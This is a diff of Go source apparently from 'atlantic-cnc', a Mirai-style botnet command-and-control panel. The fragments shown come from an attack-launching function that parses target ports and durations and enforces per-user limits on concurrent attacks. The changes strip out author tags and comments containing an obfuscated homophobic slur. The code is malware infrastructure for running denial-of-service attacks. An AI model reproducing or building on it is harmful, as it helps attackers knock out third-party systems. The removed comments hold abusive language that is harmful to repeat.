@@ -13,7 +13,7 @@ import (
 	"atlantic-cnc/core/models/middleware/attack_sort"
 	"atlantic-cnc/core/models/client/terminal"
 //	"atlantic-cnc/core/models/json/build"
-//        "atlantic-cnc/core/sessions/animations" mert was here yoooo
+//        "atlantic-cnc/core/sessions/animations"
 )
 
 var (
@@ -162,7 +162,7 @@ func New_Attack(cmd []string, session *sessions.Session_Store) {
 //        }
 /*        else if Mirai != nil {
 		PortParsed, error := strconv.Atoi(Port); if error != nil {
-			Port = Mirai.DefaultPort // m.e....r.t.r.....u.n.s.y.o.u.f.a.g.g.....o.t.s
+			Port = Mirai.DefaultPort
 			DefaultPort = true
                 }
 		Duration, error := strconv.Atoi(Time); if error != nil {
@@ -200,7 +200,7 @@ func New_Attack(cmd []string, session *sessions.Session_Store) {
                         if session.User.Concurrents <= Ammount {
                                 terminal.Banner("user_maxconns", session.User, session.Channel, true, false, nil)
                                 return
-                        } // m.e.r.t.r.u.n.s.y.o.u.f.a.g.g.o.t.s
+                        }
 
                         var recent *database.Attack = MyRunning[0]
                         for _, attack := range MyRunning {
